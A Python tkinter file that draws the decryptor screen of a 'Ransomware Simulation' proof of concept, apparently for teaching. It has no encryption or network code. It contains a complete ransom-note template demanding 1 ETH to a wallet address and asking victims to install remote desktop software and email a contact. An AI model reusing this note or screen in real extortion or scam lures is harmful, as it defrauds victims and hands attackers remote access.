# Step 1: Importing all the necessary Modules.
import sys
import tkinter as tk
from tkinter import messagebox, simpledialog
from tkinter import ttk
from PIL import Image, ImageTk
import os
from datetime import datetime, timedelta


# Step 2: Defining the resource path function
def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)


# Global constants
ICON_PATH = resource_path("img/app_icon.ico")
LOGO_PATH = resource_path("img/logo.png")
THANKS_PATH = resource_path("img/thank-you.png")


# Step 3: Creating Main Class for Decryptor App.
class DecryptorApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.iconbitmap(ICON_PATH)
        self.title("Ransomware Simulation")
        self.configure(bg='black')
        self.geometry("900x800")
        self.initialize_ui()


# Step 4: Creating Function to Initialize the UI Components.
    def initialize_ui(self):
        logo_image = Image.open(LOGO_PATH).resize((200, 200))
        logo_photo = ImageTk.PhotoImage(logo_image)
        frame = tk.Frame(self, bg='black')# Frame to hold the logo and text
        frame.pack(pady=(20, 20))


        # Logo label with adjusted padding
        logo_label = tk.Label(frame, image=logo_photo, bg='black')
        logo_label.image = logo_photo
        logo_label.pack(side=tk.LEFT, padx=(20, 10))


# Step 5: Creating Ransom note text.
        ransom_note = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
| Attention: Your Files Are Encrypted | \n\n
To get your file back please do following instruction.
Step 1: Send 1 ETH to this address: 0x77A89BDe5421a3765328182f642E7E59315e2056 through ERC20\n
Step 2: After receive your ETH we will send you the decryption key.\n:
 ** To Recover Your Files:** \n
Install any remote desktop software and mail us at [doggu683@gmail.com]\n\n
Step 3: Wait for the decryption key to be sent to you. \n
Step 4: Enter the decryption key in the box below and click on the 'Start Decryption' button. \n\n
"""


        # Creating a Text widget for the ransom note
        ransom_note_label = tk.Text(frame, bg='black', font=('Helvetica', 12), wrap='word', height=16, width=60, borderwidth=0)
        ransom_note_label.pack(side=tk.LEFT, padx=(10, 20))


        # Creating he text with appropriate tags
        ransom_note_label.insert(tk.END, " Proof of Concept: Ransomware Simulation \n", "center_red")
        ransom_note_label.insert(tk.END, "| Attention: Your Files Are Encrypted | \n\n", "center_red")
        ransom_note_label.insert(tk.END, "This simulation is solely for educational purposes and must not be used maliciously.\n", "center_green")
        ransom_note_label.insert(tk.END, "Users are fully accountable for their actions.\n", "center_white")
        ransom_note_label.insert(tk.END, "Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key.\n\n", "center_white")
        ransom_note_label.insert(tk.END, " ** To Recover Your Files:** \n", "center_yellow")
        ransom_note_label.insert(tk.END, "Ping Us at [ mykeys@cryptolock.xyz ]\n", "center_yellow")


        # Configuring the tags
        ransom_note_label.tag_configure("center", justify='center')
        ransom_note_label.tag_configure("center_red", justify='center', foreground="red")
        ransom_note_label.tag_configure("center_green", justify='center', foreground="green")
        ransom_note_label.tag_configure("center_white", justify='center', foreground="white")
        ransom_note_label.tag_configure("center_yellow", justify='center', foreground="yellow")


        # Applying tags to specific lines
        ransom_note_label.tag_add("center", "1.0", "1.end")
        ransom_note_label.tag_add("center_red", "1.0", "2.end")
        ransom_note_label.tag_add("center_green", "4.0", "4.end")
        ransom_note_label.tag_add("center_white", "5.0", "6.end")
        ransom_note_label.tag_add("center_yellow", "8.0", "9.end")
        ransom_note_label.configure(state='disabled')
        self.setup_key_frame()
        self.setup_log_frame()
        self.setup_progress_frame()
        
# Step 6: Creating function for Setting up the frame for the decryption key input.
    def setup_key_frame(self):
        key_frame = tk.Frame(self, bg='black')
        key_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
        self.key_entry = tk.Entry(key_frame, fg='black', font=('Helvetica', 12), bd=1, relief=tk.FLAT)
        self.key_entry.pack(fill=tk.X, side=tk.LEFT, expand=True, padx=(10, 0), ipady=8)
        tk.Button(key_frame, text="START DECRYPTION", bg='#d9534f', fg='white', font=('Helvetica', 12),
                  relief=tk.FLAT).pack(side=tk.RIGHT, padx=(10, 0))
        
# Step 7: Creating Function for the logging message with banner.
    def setup_log_frame(self):
        log_frame = tk.Frame(self, bg='black')  # Dark background
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)


        # Banner at the top of the log
        banner_text = "Welcome to CryptoLock - [HACKER MODE]"
        banner_label = tk.Label(log_frame, text=banner_text, fg='orange', bg='black', font=('Courier New', 12))
        banner_label.pack(side=tk.TOP, fill=tk.X)
        self.log_listbox = tk.Listbox(log_frame, height=6, width=50, bg='black', fg='#00FF00', font=('Courier New', 10))
        self.log_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)


        # Scrollbar for the Listbox
        scrollbar = tk.Scrollbar(log_frame, orient="vertical", command=self.log_listbox.yview)
        scrollbar.pack(side="right", fill="y")
        self.log_listbox.config(yscrollcommand=scrollbar.set)


#Step 8: setting up the frame for decryption progress.
    def setup_progress_frame(self):
        self.progress_frame = tk.Frame(self, bg='black')
        self.progress_frame.pack(fill=tk.X, padx=10, pady=20)
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Enhanced.Horizontal.TProgressbar", troughcolor='black', background='green', thickness=20)
        self.progress = ttk.Progressbar(self.progress_frame, style="Enhanced.Horizontal.TProgressbar",
                                        orient=tk.HORIZONTAL, length=400, mode='determinate')
        self.progress.pack(fill=tk.X, expand=True)
        self.progress_label = tk.Label(self.progress_frame, text="Decryption Progress: 0%", bg='black', fg='white')
        self.progress_label.pack()


# Step 9: Running the program.
if __name__ == "__main__":
    app = DecryptorApp()
    app.mainloop()

